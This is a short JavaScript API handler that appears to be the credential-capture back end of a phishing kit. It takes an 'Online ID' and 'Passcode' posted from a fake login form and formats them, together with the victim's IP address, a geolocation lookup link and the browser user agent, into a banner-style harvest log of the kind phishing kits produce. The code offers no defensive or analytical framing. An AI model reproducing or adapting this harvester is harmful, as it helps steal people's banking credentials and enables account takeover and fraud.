export default function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ signal: "bad", msg: "Method not allowed" });
  }

  const { ai, pr } = req.body;

  if (!ai || !pr) {
    return res.json({
      signal: "bad",
      msg: "Please fill in all the fields.",
    });
  }

  const ip =
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.socket.remoteAddress;

  const userAgent = req.headers["user-agent"] || "Unknown";

  let message = "";
  message += "|----------| xLs |--------------|\n";
  message += `Online ID : ${ai}\n`;
  message += `Passcode : ${pr}\n`;
  message += "|--------------- I N F O | I P -------------------|\n";
  message += `|Client IP: ${ip}\n`;
  message += `|--- http://www.geoiptool.com/?IP=${ip} ----\n`;
  message += `User Agent : ${userAgent}\n`;
  message += "|----------- CrEaTeD--------------|\n";

  res.setHeader("Content-Type", "text/plain");
  res.send(message);
}


